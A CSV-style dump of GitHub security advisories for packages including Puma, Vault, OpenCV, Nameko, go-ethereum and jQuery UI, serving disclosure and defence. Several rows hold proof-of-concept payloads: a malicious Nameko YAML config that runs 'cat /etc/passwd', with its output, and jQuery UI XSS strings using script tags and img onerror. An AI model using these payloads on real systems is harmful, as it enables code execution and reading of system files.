This vulnerability was patched in Puma 5.5.1 and 4.3.9.

### Workarounds

This vulnerability only affects Puma installations without any proxy in front.

Use a proxy which does not forward LF characters as line endings.

Proxies which do not forward LF characters as line endings:

* Nginx
* Apache (>2.4.25)
* Haproxy
* Caddy
* Traefik

### Possible Breakage

If you are [dealing with legacy clients that want to send `LF` as a line ending](https://stackoverflow.com/questions/43574428/have-apache-accept-lf-vs-crlf-in-request-headers) in an HTTP header, this will cause those clients to receive a `400` error.

### References

* [HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [Puma](https://github.com/puma/puma)
* See our [security policy](https://github.com/puma/puma/security/policy)
",rubygems
1812,38410,io.kubernetes:client-java,GHSA-m8wh-mqgf-rr8g,CVE-2021-25738,https://github.com/advisories/GHSA-m8wh-mqgf-rr8g,moderate,2021-10-12 17:50:25 UTC,Code injection in Kubernetes Java Client,Loading specially-crafted yaml with the Kubernetes Java Client library can lead to code execution.,maven
1813,22634,vault,GHSA-362v-wg5p-64w2,CVE-2021-42135,https://github.com/advisories/GHSA-362v-wg5p-64w2,high,2021-10-12 18:41:16 UTC,Incorrect Privilege Assignment in HashiCorp Vault,"HashiCorp Vault and Vault Enterprise 1.8.x through 1.8.4 may have an unexpected interaction between glob-related policies and the Google Cloud secrets engine. Users may, in some situations, have more privileges than intended, e.g., a user with read permission for the /gcp/roleset/* path may be able to issue Google Cloud service account credentials.",go
1814,22634,vault,GHSA-qv95-g3gm-x542,CVE-2021-41802,https://github.com/advisories/GHSA-qv95-g3gm-x542,moderate,2021-10-12 16:39:01 UTC,Privilege Escalation in Hashicorp Vault,HashiCorp Vault and Vault Enterprise through 1.7.4 and 1.8.3 allowed a user with write permission to an entity alias ID sharing a mount accessor with another user to acquire this other user’s policies by merging their identities. Fixed in Vault and Vault Enterprise 1.7.5 and 1.8.4.,go
1815,34450,org.opencms:opencms-core,GHSA-g6v7-vqhx-6v6c,CVE-2021-3312,https://github.com/advisories/GHSA-g6v7-vqhx-6v6c,moderate,2021-10-12 17:23:40 UTC,XML External Entity Reference in org.opencms:opencms-core,"An XML external entity (XXE) vulnerability in Alkacon OpenCms 11.0, 11.0.1 and 11.0.2 allows remote authenticated users with edit privileges to exfiltrate files from the server's file system by uploading a crafted SVG document.",maven
1816,17583,class-validator,GHSA-fj58-h2fr-3pp2,CVE-2019-18413,https://github.com/advisories/GHSA-fj58-h2fr-3pp2,moderate,2021-10-12 16:35:45 UTC,SQL Injection and Cross-site Scripting in class-validator,"In TypeStack class-validator 0.10.2, validate() input validation can be bypassed because certain internal attributes can be overwritten via a conflicting name. Even though there is an optional forbidUnknownValues parameter that can be used to reduce the risk of this bypass, this option is not documented and thus most developers configure input validation in the vulnerable default manner. With this vulnerability, attackers can launch SQL Injection or XSS attacks by injecting arbitrary malicious input. NOTE: a software maintainer agrees with the ""is not documented"" finding but suggests that much of the responsibility for the risk lies in a different product.",npm
1817,20092,ansible,GHSA-p75j-wc34-527c,CVE-2019-10217,https://github.com/advisories/GHSA-p75j-wc34-527c,moderate,2021-10-12 16:31:59 UTC,Exposure of Sensitive Information to an Unauthorized Actor in ansible,A flaw was found in ansible 2.8.0 before 2.8.4. Fields managing sensitive data should be set as such by no_log feature. Some of these fields in GCP modules are not set properly. service_account_contents() which is common class for all gcp modules is not setting no_log to True. Any sensitive data managed by that function would be leak as an output when running ansible playbooks.,pip
1818,20002,python-keystoneclient,GHSA-c3xq-cj8f-7829,CVE-2013-2166,https://github.com/advisories/GHSA-c3xq-cj8f-7829,critical,2021-10-12 16:31:43 UTC,Inadequate Encryption Strength in python-keystoneclient,python-keystoneclient version 0.2.3 to 0.2.5 has middleware memcache encryption bypass,pip
1819,29089,fastecdsa,GHSA-56wv-2wr9-3h9r,CVE-2020-12607,https://github.com/advisories/GHSA-56wv-2wr9-3h9r,high,2021-10-12 16:30:37 UTC,Improper Verification of Cryptographic Signature in fastecdsa,"An issue was discovered in fastecdsa before 2.1.2. When using the NIST P-256 curve in the ECDSA implementation, the point at infinity is mishandled. This means that for an extreme value in k and s^-1, the signature verification fails even if the signature is correct. This behavior is not solely a usability problem. There are some threat models where an attacker can benefit by successfully guessing users for whom signature verification will fail.",pip
1820,29840,opencv-python,GHSA-cvhw-2593-5j2q,CVE-2016-1516,https://github.com/advisories/GHSA-cvhw-2593-5j2q,high,2021-10-12 22:00:08 UTC,Double Free in OpenCV,OpenCV 3.0.0 has a double free issue that allows attackers to execute arbitrary code. This issue was fixed in OpenCV version 3.3.1 (corresponding to OpenCV-Python and and OpenCV-Contrib-Python 3.3.1.11).,pip
1821,29840,opencv-python,GHSA-fffj-9qwg-qmh5,CVE-2016-1517,https://github.com/advisories/GHSA-fffj-9qwg-qmh5,moderate,2021-10-12 22:00:31 UTC,Improper Input Validation in OpenCV,OpenCV 3.0.0 allows remote attackers to cause a denial of service (segfault) via vectors involving corrupt chunks. This issue was fixed in OpenCV version 3.3.1 (corresponding to OpenCV 3.3.1.11).,pip
1822,29840,opencv-python,GHSA-8w3x-457r-wg53,CVE-2017-12597,https://github.com/advisories/GHSA-8w3x-457r-wg53,high,2021-10-12 22:00:41 UTC,Out-of-bounds Write in OpenCV,OpenCV (Open Source Computer Vision Library) through 3.3 (corresponding to opencv-python and opencv-contrib-python through 3.3.0.9) has an out-of-bounds write error in the function FillColorRow1 in utils.cpp when reading an image file by using cv::imread.,pip
1823,29840,opencv-python,GHSA-33h2-69j3-r336,CVE-2017-12598,https://github.com/advisories/GHSA-33h2-69j3-r336,high,2021-10-12 22:00:51 UTC,Out-of-bounds Read in OpenCV,"OpenCV (Open Source Computer Vision Library) through 3.3 (corresponding to OpenCV-Python 3.3.0.9) has an out-of-bounds read error in the cv::RBaseStream::readBlock function in modules/imgcodecs/src/bitstrm.cpp when reading an image file by using cv::imread, as demonstrated by the 8-opencv-invalid-read-fread test case.",pip
1824,29840,opencv-python,GHSA-fvq6-392h-6mjj,CVE-2017-12599,https://github.com/advisories/GHSA-fvq6-392h-6mjj,high,2021-10-12 22:01:08 UTC,Out-of-bounds Read in OpenCV,OpenCV (Open Source Computer Vision Library) through 3.3 (corresponding to OpenCV-Python 3.3.0.9) has an out-of-bounds read error in the function icvCvt_BGRA2BGR_8u_C4C3R when reading an image file by using cv::imread.,pip
1825,29840,opencv-python,GHSA-fr58-2xhv-qp3w,CVE-2017-12600,https://github.com/advisories/GHSA-fr58-2xhv-qp3w,high,2021-10-12 22:01:16 UTC,Denial of Service in OpenCV,"OpenCV (Open Source Computer Vision Library) through 3.3 (corresponding to OpenCV-Python 3.3.0.9) has a denial of service (CPU consumption) issue, as demonstrated by the 11-opencv-dos-cpu-exhaust test case.",pip
1826,29840,opencv-python,GHSA-w96g-3p64-63wr,CVE-2017-12601,https://github.com/advisories/GHSA-w96g-3p64-63wr,high,2021-10-12 22:01:23 UTC,Improper Restriction of Operations within the Bounds of a Memory Buffer in OpenCV,"OpenCV (Open Source Computer Vision Library) through 3.3 (corresponding to OpenCV-Python 3.3.0.9) has a buffer overflow in the cv::BmpDecoder::readData function in modules/imgcodecs/src/grfmt_bmp.cpp when reading an image file by using cv::imread, as demonstrated by the 4-buf-overflow-readData-memcpy test case.",pip
1827,29840,opencv-python,GHSA-pqjj-6f5q-gqph,CVE-2017-12602,https://github.com/advisories/GHSA-pqjj-6f5q-gqph,high,2021-10-12 22:01:34 UTC,Denial of Service in OpenCV,"OpenCV (Open Source Computer Vision Library) through 3.3 (corresponding to OpenCV-Python 3.3.0.9) has a denial of service (memory consumption) issue, as demonstrated by the 10-opencv-dos-memory-exhaust test case.",pip
1828,29840,opencv-python,GHSA-6v6p-p97v-g2p7,CVE-2017-12603,https://github.com/advisories/GHSA-6v6p-p97v-g2p7,high,2021-10-12 22:01:44 UTC,Out-of-bounds Write in OpenCV,"OpenCV (Open Source Computer Vision Library) through 3.3 (corresponding to OpenCV-Python and OpenCV-Contrib-Python 3.3.0.9) has an invalid write in the cv::RLByteStream::getBytes function in modules/imgcodecs/src/bitstrm.cpp when reading an image file by using cv::imread, as demonstrated by the 2-opencv-heapoverflow-fseek test case.",pip
1829,29840,opencv-python,GHSA-c7gp-2pch-qh2v,CVE-2017-12604,https://github.com/advisories/GHSA-c7gp-2pch-qh2v,high,2021-10-12 22:01:55 UTC,Out-of-bounds Write in OpenCV,OpenCV (Open Source Computer Vision Library) through 3.3 (corresponding to OpenCV-Python and OpenCV-Contrib-Python 3.3.0.9) has an out-of-bounds write error in the FillUniColor function in utils.cpp when reading an image file by using cv::imread.,pip
1830,29840,opencv-python,GHSA-rqxg-xvcq-3v2f,CVE-2017-12605,https://github.com/advisories/GHSA-rqxg-xvcq-3v2f,high,2021-10-12 22:02:04 UTC,Out-of-bounds Write in OpenCV,OpenCV (Open Source Computer Vision Library) through 3.3 (corresponding to OpenCV-Python and OpenCV-Contrib-Python 3.3.0.9) has an out-of-bounds write error in the FillColorRow8 function in utils.cpp when reading an image file by using cv::imread.,pip
1831,29840,opencv-python,GHSA-vc29-rj92-gc7j,CVE-2017-12606,https://github.com/advisories/GHSA-vc29-rj92-gc7j,high,2021-10-12 22:02:12 UTC,Out-of-bounds Write in OpenCV,OpenCV (Open Source Computer Vision Library) through 3.3 (corresponding to OpenCV-Python and OpenCV-Contrib-Python 3.3.0.9) has an out-of-bounds write error in the function FillColorRow4 in utils.cpp when reading an image file by using cv::imread.,pip
1832,29840,opencv-python,GHSA-5rpc-gwh9-q9fg,CVE-2017-12862,https://github.com/advisories/GHSA-5rpc-gwh9-q9fg,high,2021-10-12 22:02:21 UTC,Improper Restriction of Operations within the Bounds of a Memory Buffer in OpenCV,"In modules/imgcodecs/src/grfmt_pxm.cpp, the length of buffer AutoBuffer _src is small than expected, which will cause copy buffer overflow later. If the image is from remote, may lead to remote code execution or denial of service. This affects OpenCV 3.3 (corresponding to OpenCV-Python 3.3.0.9) and earlier.",pip
1833,29840,opencv-python,GHSA-wq8f-wvqp-xvvm,CVE-2017-12863,https://github.com/advisories/GHSA-wq8f-wvqp-xvvm,high,2021-10-12 22:02:35 UTC,Integer Overflow or Wraparound in OpenCV,"In opencv/modules/imgcodecs/src/grfmt_pxm.cpp, function PxMDecoder::readData has an integer overflow when calculate src_pitch. If the image is from remote, may lead to remote code execution or denial of service. This affects OpenCV 3.3 (corresponding to OpenCV-Python 3.3.0.9) and earlier.",pip
1834,29840,opencv-python,GHSA-267x-w5hx-8hjr,CVE-2017-12864,https://github.com/advisories/GHSA-267x-w5hx-8hjr,high,2021-10-12 22:02:45 UTC,Integer Overflow or Wraparound in OpenCV,"In opencv/modules/imgcodecs/src/grfmt_pxm.cpp, function ReadNumber did not checkout the input length, which lead to integer overflow. If the image is from remote, may lead to remote code execution or denial of service. This affects OpenCV 3.3 (corresponding with OpenCV-Python version 3.3.0.9) and earlier.",pip
1835,29840,opencv-python,GHSA-634c-v2xv-ffpg,CVE-2017-14136,https://github.com/advisories/GHSA-634c-v2xv-ffpg,moderate,2021-10-12 22:02:51 UTC,Out-of-bounds Write in OpenCV,OpenCV (Open Source Computer Vision Library) 3.3 (corresponding to OpenCV-Python 3.3.0.9) has an out-of-bounds write error in the function FillColorRow1 in utils.cpp when reading an image file by using cv::imread. NOTE: this vulnerability exists because of an incomplete fix for CVE-2017-12597.,pip
1836,29840,opencv-python,GHSA-jcxv-2j3h-mg59,CVE-2017-17760,https://github.com/advisories/GHSA-jcxv-2j3h-mg59,moderate,2021-10-12 22:03:09 UTC,Improper Restriction of Operations within the Bounds of a Memory Buffer in OpenCV,"OpenCV 3.3.1 (corresponding with opencv-python and opencv-contrib-python 3.3.1.11) has a Buffer Overflow in the cv::PxMDecoder::readData function in grfmt_pxm.cpp, because an incorrect size value is used.",pip
1837,29840,opencv-python,GHSA-83rh-hx5x-q9p5,CVE-2017-18009,https://github.com/advisories/GHSA-83rh-hx5x-q9p5,high,2021-10-12 22:03:23 UTC,Out-of-bounds Read in OpenCV,"In OpenCV 3.3.1 (corresponding with OpenCV-Python 3.3.1.11), a heap-based buffer over-read exists in the function cv::HdrDecoder::checkSignature in modules/imgcodecs/src/grfmt_hdr.cpp.",pip
1838,29840,opencv-python,GHSA-m43c-649m-pm48,CVE-2017-1000450,https://github.com/advisories/GHSA-m43c-649m-pm48,high,2021-10-12 22:03:32 UTC,Integer Overflow or Wraparound in OpenCV.,"In opencv/modules/imgcodecs/src/utils.cpp, functions FillUniColor and FillUniGray do not check the input length, which can lead to integer overflow. If the image is from remote, may lead to remote code execution or denial of service. This affects Opencv 3.3 (corresponding with OpenCV-Python 3.3.0.9) and earlier.",pip
1839,29840,opencv-python,GHSA-9g8h-pjm4-q92p,CVE-2018-5268,https://github.com/advisories/GHSA-9g8h-pjm4-q92p,moderate,2021-10-12 22:23:41 UTC,Out-of-bounds Write in OpenCV.,"In OpenCV 3.3.1 (corresponding with OpenCV-Python 3.3.1.11), a heap-based buffer overflow happens in cv::Jpeg2KDecoder::readComponent8u in modules/imgcodecs/src/grfmt_jpeg2000.cpp when parsing a crafted image file.",pip
1840,29840,opencv-python,GHSA-89rj-5ggj-3p9p,CVE-2018-5269,https://github.com/advisories/GHSA-89rj-5ggj-3p9p,moderate,2021-10-12 22:03:41 UTC,Reachable Assertion in OpenCV.,"In OpenCV 3.3.1 (corresponds with OpenCV-Python 3.3.1.11), an assertion failure happens in cv::RBaseStream::setPos in modules/imgcodecs/src/bitstrm.cpp because of an incorrect integer cast.",pip
1841,29840,opencv-python,GHSA-fm39-cw8h-3p63,CVE-2019-14491,https://github.com/advisories/GHSA-fm39-cw8h-3p63,high,2021-10-12 22:07:14 UTC,Out-of-bounds Read in OpenCV,"An issue was discovered in OpenCV before 3.4.7 and 4.x before 4.1.1 (OpenCV-Python before 3.4.7.28 and 4.x before 4.1.1.26). There is an out of bounds read in the function cv::predictOrdered<cv::HaarEvaluator> in modules/objdetect/src/cascadedetect.hpp, which leads to denial of service.",pip
1842,29840,opencv-python,GHSA-fw99-f933-rgh8,CVE-2019-14492,https://github.com/advisories/GHSA-fw99-f933-rgh8,high,2021-10-12 22:09:31 UTC,Out-of-bounds Read and Out-of-bounds Write in OpenCV,"An issue was discovered in OpenCV before 3.4.7 and 4.x before 4.1.1 (OpenCV-Python before 3.4.7.28 and 4.x before 4.1.1.26). There is an out of bounds read/write in the function HaarEvaluator::OptFeature::calc in modules/objdetect/src/cascadedetect.hpp, which leads to denial of service.",pip
1843,29840,opencv-python,GHSA-3448-vrgh-85xr,CVE-2019-14493,https://github.com/advisories/GHSA-3448-vrgh-85xr,high,2021-10-12 22:21:43 UTC,NULL Pointer Dereference in OpenCV.,An issue was discovered in OpenCV before 4.1.1 (OpenCV-Python before 4.1.1.26). There is a NULL pointer dereference in the function cv::XMLParser::parse at modules/core/src/persistence.cpp.,pip
1844,29840,opencv-python,GHSA-hxfw-jm98-v4mq,CVE-2019-15939,https://github.com/advisories/GHSA-hxfw-jm98-v4mq,moderate,2021-10-12 22:21:56 UTC,Divide By Zero in OpenCV.,An issue was discovered in OpenCV 4.1.0 (OpenCV-Python 4.1.0.25). There is a divide-by-zero error in cv::HOGDescriptor::getDescriptorSize in modules/objdetect/src/hog.cpp.,pip
1845,29840,opencv-python,GHSA-x3rm-644h-67m8,CVE-2019-16249,https://github.com/advisories/GHSA-x3rm-644h-67m8,moderate,2021-10-12 22:22:05 UTC,Out-of-bounds Read in OpenCV,OpenCV 4.1.1 has an out-of-bounds read in hal_baseline::v_load in core/hal/intrin_sse.hpp when called from computeSSDMeanNorm in modules/video/src/dis_flow.cpp.,pip
1846,29840,opencv-python,GHSA-8849-5h85-98qw,CVE-2019-9423,https://github.com/advisories/GHSA-8849-5h85-98qw,high,2021-10-12 22:22:17 UTC,Out-of-bounds Write in OpenCV,"In opencv calls that use libpng, there is a possible out of bounds write due to a missing bounds check. This could lead to local escalation of privilege with no additional execution privileges required. User interaction is not required for exploitation. Product: AndroidVersions: Android-10Android ID: A-110986616",pip
1847,29840,opencv-python,GHSA-jggw-2q6g-c3m6,CVE-2019-19624,https://github.com/advisories/GHSA-jggw-2q6g-c3m6,moderate,2021-10-12 22:22:58 UTC,Out-of-bounds Read in OpenCV,"An out-of-bounds read was discovered in OpenCV before 4.1.1 (OpenCV-Python before 4.1.0.25). Specifically, variable coarsest_scale is assumed to be greater than or equal to finest_scale within the calc()/ocl_calc() functions in dis_flow.cpp. However, this is not true when dealing with small images, leading to an out-of-bounds read of the heap-allocated arrays Ux and Uy.",pip
1848,30443,vyper,GHSA-xv8x-pr4h-73jv,CVE-2021-41121,https://github.com/advisories/GHSA-xv8x-pr4h-73jv,high,2021-10-12 15:59:29 UTC,Memory corruption when returning a literal struct with a private call inside of it,"### Impact

When performing a function call inside a literal struct, there is a memory corruption issue that occurs because of an incorrect pointer to the the top of the stack.

### Patches
0.3.0 / #2447

*",pip
1849,29840,opencv-python,GHSA-m6vm-8g8v-xfjh,CVE-2019-5063,https://github.com/advisories/GHSA-m6vm-8g8v-xfjh,high,2021-10-12 22:23:13 UTC,Out-of-bounds Write in OpenCV,"An exploitable heap buffer overflow vulnerability exists in the data structure persistence functionality of OpenCV 4.1.0 (corresponds with OpenCV-Python 4.1.0.25). A specially crafted XML file can cause a buffer overflow, resulting in multiple heap corruptions and potential code execution. An attacker can provide a specially crafted file to trigger this vulnerability.",pip
1850,29840,opencv-python,GHSA-q799-q27x-vp7w,CVE-2019-5064,https://github.com/advisories/GHSA-q799-q27x-vp7w,high,2021-10-12 22:23:21 UTC,Out-of-bounds Write in OpenCV,"An exploitable heap buffer overflow vulnerability exists in the data structure persistence functionality of OpenCV, version 4.1.0 (corresponds with OpenCV-Python version 4.1.2.30). A specially crafted JSON file can cause a buffer overflow, resulting in multiple heap corruptions and potentially code execution. An attacker can provide a specially crafted file to trigger this vulnerability.",pip
1851,35281,com.vaadin:vaadin-server,GHSA-j23j-q57m-63v3,,https://github.com/advisories/GHSA-j23j-q57m-63v3,moderate,2021-10-13 18:54:50 UTC,Denial of service in DataCommunicator class in Vaadin 8,Missing check in `DataCommunicator` class in `com.vaadin:vaadin-server` versions 8.0.0 through 8.14.0 (Vaadin 8.0.0 through 8.14.0) allows authenticated network attacker to cause heap exhaustion by requesting too many rows of data.,maven
1852,38151,com.googlecode.owasp-java-html-sanitizer:owasp-java-html-sanitizer,GHSA-3w73-fmf3-hg5c,CVE-2021-42575,https://github.com/advisories/GHSA-3w73-fmf3-hg5c,critical,2021-10-19 20:15:50 UTC,Policies not properly enforced in OWASP Java HTML Sanitizer,"The OWASP Java HTML Sanitizer before 20211018.1 does not properly enforce policies associated with the `SELECT`, `STYLE`, and `OPTION` elements.",maven
1853,22922,bluemonday,GHSA-x95h-979x-cf3j,CVE-2021-42576,https://github.com/advisories/GHSA-x95h-979x-cf3j,moderate,2021-10-19 20:15:30 UTC,Policies not properly enforced in bluemonday,"The bluemonday sanitizer before 1.0.16 for Go, and before 0.0.8 for Python (in pybluemonday), does not properly enforce policies associated with the SELECT, STYLE, and OPTION elements.",go
1854,20563,nameko,GHSA-6p52-jr3q-c94g,CVE-2021-41078,https://github.com/advisories/GHSA-6p52-jr3q-c94g,high,2021-10-19 15:28:57 UTC,Arbitrary code execution due to YAML deserialization,"### Impact

Nameko can be tricked to perform arbitrary code execution when deserialising a YAML config file. Example:

``` yaml
# malicious.yaml
!!python/object/new:type
args: ['z', !!python/tuple [], {'extend': !!python/name:exec }]
listitems: ""__import__('os').system('cat /etc/passwd')""
```

``` shell
$ nameko run --config malicious.yaml test
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
... 
```

### Patches

The problem was fixed in https://github.com/nameko/nameko/pull/722 and released in version 2.14.0, and in rc10 of the v3 pre-release.

Versions prior to 2.14.0, and v3.0.0rc0 through v3.0.0rc9 are still vulnerable.

### Workarounds

The vulnerability is exploited by config files with malicious content. It can be avoided by only using config files that you trust.",pip
1855,20024,notebook,GHSA-4952-p58q-6crx,CVE-2021-32797,https://github.com/advisories/GHSA-4952-p58q-6crx,high,2021-08-23 19:40:22 UTC,JupyterLab: XSS due to lack of sanitization of the action attribute of an html <form>,"### Impact

Untrusted notebook can execute code on load. This is a remote code execution, but requires user action to open a notebook.

### Patches

Patched in the following versions: 3.1.4, 3.0.17, 2.3.2, 2.2.10, 1.2.21.

### References

[OWASP Page on Restricting Form Submissions](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)

### For more information

If you have any questions or comments about this advisory, or vulnerabilities to report, please email our security list security@ipython.org.

Credit: Guillaume Jeanne from Google
",pip
1856,35825,org.keycloak:keycloak-core,GHSA-7m27-3587-83xf,CVE-2019-10170,https://github.com/advisories/GHSA-7m27-3587-83xf,high,2021-10-21 17:46:27 UTC,Privilege Defined With Unsafe Actions in Keycloak,"A flaw was found in the Keycloak admin console, where the realm management interface permits a script to be set via the policy. This flaw allows an attacker with authenticated user and realm management permissions to configure a malicious script to trigger and execute arbitrary code with the permissions of the application user.",maven
1857,17510,ua-parser-js,GHSA-pjwm-rvh2-c87w,,https://github.com/advisories/GHSA-pjwm-rvh2-c87w,critical,2021-10-22 20:38:14 UTC,Embedded malware in ua-parser-js,"The npm package `ua-parser-js` had three versions published with malicious code. Users of affected versions (0.7.29, 0.8.0, 1.0.0) should upgrade as soon as possible and check their systems for suspicious activity. See [this issue](https://github.com/faisalman/ua-parser-js/issues/536) for details as they unfold.

Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",npm
1858,18135,tinymce,GHSA-5h9g-x5rv-25wg,,https://github.com/advisories/GHSA-5h9g-x5rv-25wg,moderate,2021-10-22 16:24:02 UTC,Cross-site scripting vulnerability in TinyMCE,"### Impact
A cross-site scripting (XSS) vulnerability was discovered in the schema validation logic of the core parser. The vulnerability allowed arbitrary JavaScript execution when inserting a specially crafted piece of content into the editor using the clipboard or editor APIs. This malicious content could then end up in content published outside the editor, if no server-side sanitization was performed. This impacts all users who are using TinyMCE 5.8.2 or lower.

### Patches
This vulnerability has been patched in TinyMCE 5.9.0 by ensuring schema validation was still performed after unwrapping invalid elements.

### Workarounds
To work around this vulnerability, either:
- Upgrade to TinyMCE 5.9.0 or higher
- Manually sanitize the content using the `BeforeSetContent` event (see below)

#### Example: Manually sanitize content
```js
editor.on('BeforeSetContent', function(e) {
  var sanitizedContent = ...; // Manually sanitize content here
  e.content = sanitizedContent;
});
```

### Acknowledgements
Tiny Technologies would like to thank William Bowling for discovering this vulnerability.

### References
https://www.tiny.cloud/docs/release-notes/release-notes59/#securityfixes

### For more information
If you have any questions or comments about this advisory:
* Email us at [infosec@tiny.cloud](mailto:infosec@tiny.cloud)
* Open an issue in the [TinyMCE repo](https://github.com/tinymce/tinymce/issues)",npm
1859,22840,gjson,GHSA-ppj4-34rq-v8j9,CVE-2021-42836,https://github.com/advisories/GHSA-ppj4-34rq-v8j9,high,2021-10-25 19:43:15 UTC,regular expression denial of service in gjson,GJSON before 1.9.3 allows a ReDoS (regular expression denial of service) attack.,go
1860,22961,go-ethereum,GHSA-59hh-656j-3p7v,CVE-2021-41173,https://github.com/advisories/GHSA-59hh-656j-3p7v,moderate,2021-10-25 19:42:57 UTC,DoS via maliciously crafted p2p message,"### Impact

A vulnerable node is susceptible to crash when processing a maliciously crafted message from a peer, via the `snap/1` protocol. The crash can be triggered by sending a malicious `snap/1` `GetTrieNodes` package. 

### Details

On September 21, 2021, geth-team member Gary Rong (@rjl493456442) found a way to crash the snap request handler . 
By using this vulnerability, a peer connected on the `snap/1` protocol could cause a vulnerable node to crash with a `panic`.

In the `trie.TryGetNode` implementation, if the requested path is reached, the associated node will be returned. However the nilness is
not checked there.

```golang
func (t *Trie) tryGetNode(origNode node, path []byte, pos int) (item []byte, newnode node, resolved int, err error) {
	// If we reached the requested path, return the current node
	if pos >= len(path) {
		// Although we most probably have the original node expanded, encoding
		// that into consensus form can be nasty (needs to cascade down) and
		// time consuming. Instead, just pull the hash up from disk directly.
		var hash hashNode
		if node, ok := origNode.(hashNode); ok {
			hash = node
		} else {
			hash, _ = origNode.cache()
		}
```
More specifically the `origNode` can be nil(e.g. the child of fullnode) and system can panic at line `hash, _ = origNode.cache()`. 

When investigating this, @holiman tried to find it via fuzzing, which uncovered a second crasher, also related to the snap `GetTrieNodes` package. If the caller requests a storage trie:
```golang
				// Storage slots requested, open the storage trie and retrieve from there
				account, err := snap.Account(common.BytesToHash(pathset[0]))
				loads++ // always account database reads, even for failures
				if account == nil {
					break
				}
				stTrie, err := trie.NewSecure(common.BytesToHash(account.Root), triedb)
```
The code assumes that `snap.Account` returns _either_ a non-nil response unless `error` is also provided. This is however not the case, since `snap.Account` can return `nil, nil`. 

### Patches

```diff
--- a/eth/protocols/snap/handler.go
+++ b/eth/protocols/snap/handler.go
@@ -469,7 +469,7 @@ func handleMessage(backend Backend, peer *Peer) error {
 				// Storage slots requested, open the storage trie and retrieve from there
 				account, err := snap.Account(common.BytesToHash(pathset[0]))
 				loads++ // always account database reads, even for failures
-				if err != nil {
+				if err != nil || account == nil {
 					break
 				}
 				stTrie, err := trie.NewSecure(common.BytesToHash(account.Root), triedb)
diff --git a/trie/trie.go b/trie/trie.go
index 7ea7efa835..d0f0d4e2bc 100644
--- a/trie/trie.go
+++ b/trie/trie.go
@@ -174,6 +174,10 @@ func (t *Trie) TryGetNode(path []byte) ([]byte, int, error) {
 }
 
 func (t *Trie) tryGetNode(origNode node, path []byte, pos int) (item []byte, newnode node, resolved int, err error) {
+	// If non-existent path requested, abort
+	if origNode == nil {
+		return nil, nil, 0, nil
+	}
 	// If we reached the requested path, return the current node
 	if pos >= len(path) {
 		// Although we most probably have the original node expanded, encoding
@@ -193,10 +197,6 @@ func (t *Trie) tryGetNode(origNode node, path []byte, pos int) (item []byte, new
 	}
 	// Path still needs to be traversed, descend into children
 	switch n := (origNode).(type) {
-	case nil:
-		// Non-existent path requested, abort
-		return nil, nil, 0, nil
-
 	case valueNode:
 		// Path prematurely ended, abort
 		return nil, nil, 0, nil

``` 
The fixes were merged into [#23657](https://github.com/ethereum/go-ethereum/pull/23657), with commit [f1fd963](https://github.com/ethereum/go-ethereum/pull/23657/commits/f1fd963a5a965e643e52fcf805a2a02a323c32b8), and released as part of Geth [v1.10.9](https://github.com/ethereum/go-ethereum/tree/v1.10.9) on Sept 29, 2021. 

### Workarounds

Apply the patch above or upgrade to a version which is not vulnerable.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [go-ethereum](https://github.com/ethereum/go-ethereum/)
* Email us at [security@ethereum.org](mailto:security@ethereum.org)
",go
1861,17417,jquery-ui,GHSA-j7qv-pgf6-hvh4,CVE-2021-41183,https://github.com/advisories/GHSA-j7qv-pgf6-hvh4,moderate,2021-10-26 14:55:21 UTC,XSS in `*Text` options of the Datepicker widget in jquery-ui,"### Impact
Accepting the value of various `*Text` options of the Datepicker widget from untrusted sources may execute untrusted code. For example, initializing the datepicker in the following way:
```js
$( ""#datepicker"" ).datepicker( {
	showButtonPanel: true,
	showOn: ""both"",
	closeText: ""<script>doEvilThing( 'closeText XSS' )</script>"",
	currentText: ""<script>doEvilThing( 'currentText XSS' )</script>"",
	prevText: ""<script>doEvilThing( 'prevText XSS' )</script>"",
	nextText: ""<script>doEvilThing( 'nextText XSS' )</script>"",
	buttonText: ""<script>doEvilThing( 'buttonText XSS' )</script>"",
	appendText: ""<script>doEvilThing( 'appendText XSS' )</script>"",
} );
```
will call `doEvilThing` with 6 different parameters coming from all `*Text` options.

### Patches
The issue is fixed in jQuery UI 1.13.0. The values passed to various `*Text` options are now always treated as pure text, not HTML.

### Workarounds
A workaround is to not accept the value of the `*Text` options from untrusted sources.

### For more information
If you have any questions or comments about this advisory, search for a relevant issue in [the jQuery UI repo](https://github.com/jquery/jquery-ui/issues). If you don't find an answer, open a new issue.",npm
1862,17417,jquery-ui,GHSA-gpqq-952q-5327,CVE-2021-41184,https://github.com/advisories/GHSA-gpqq-952q-5327,moderate,2021-10-26 14:55:12 UTC,XSS in the `of` option of the `.position()` util in jquery-ui,"### Impact
Accepting the value of the `of` option of the [`.position()`](https://api.jqueryui.com/position/) util from untrusted sources may execute untrusted code. For example, invoking the following code:
```js
$( ""#element"" ).position( {
	my: ""left top"",
	at: ""right bottom"",
	of: ""<img onerror='doEvilThing()' src='/404' />"",
	collision: ""none""
} );
```
will call the `doEvilThing()` function.

### Patches
The issue is fixed in jQuery UI 1.13.0. Any string value passed to the `of` option is now treated as a CSS selector.

### Workarounds
A workaround is to not accept the value of the `of` option from untrusted sources.

### For more information
If you have any questions or comments about this advisory, search for a relevant issue in [the jQuery UI repo](https://github.com/jquery/jquery-ui/issues). If you don't find an answer, open a new issue.",npm
1863,17417,jquery-ui,GHSA-9gj3-hwp5-pmwc,CVE-2021-41182,https://github.com/advisories/GHSA-9gj3-hwp5-pmwc,moderate,2021-10-26 14:55:02 UTC,XSS in the `altField` option of the Datepicker widget in jquery-ui,"### Impact
Accepting the value of the `altField` option of the Datepicker widget from untrusted sources may execute untrusted code. For example, initializing the datepicker in the following way:
```js
$( ""#datepicker"" ).datepicker( {
	altField: ""<img onerror='doEvilThing()' src='/404' />"",
} );
```
will call the `doEvilThing` function.

### Patches
The issue is fixed in jQuery UI 1.13.0. Any string value passed to the `altField` option is now treated as a CSS selector.

